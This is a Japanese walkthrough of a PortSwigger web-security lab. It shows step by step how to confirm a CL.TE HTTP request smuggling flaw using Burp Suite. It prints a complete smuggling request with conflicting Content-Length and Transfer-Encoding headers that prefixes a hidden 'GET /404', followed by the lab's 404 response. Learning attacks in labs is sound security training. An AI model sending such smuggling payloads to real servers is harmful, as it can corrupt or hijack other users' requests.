# HTTP リクエストの密輸、差分応答による CL.TE の脆弱性の確認

次のハッキングラボを実施  
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses  
このラボにはフロントエンドサーバーとバックエンドサーバーが含まれますが、フロントエンドサーバーはチャンクエンコーディングをサポートしていません。

1.  Burp Suite を起動して、proxy タブからブラウザを立ち上げます

- 2. ブラウザからハッキングラボにアクセスします

* 3. GET / リクエストを send to repeater します
* 4. Repeater のリクエストを表示した状態で右クリックして change to request を選択して、POST リクエストに切り替えます

- 5. リクエストを以下のように書き換えて 2 回送信します

```
POST / HTTP/1.1
Host: 0afc005503a8116c8066df9400e0006a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

2 回目のレスポンスが 404 になります

```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=HCbscveVls6K8xYB7NmNegO6P2elPOu9; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

チャンクサイズが 0 と判断され、GET /404 が 2 個目のリクエストとして扱われているので、このような動作になる
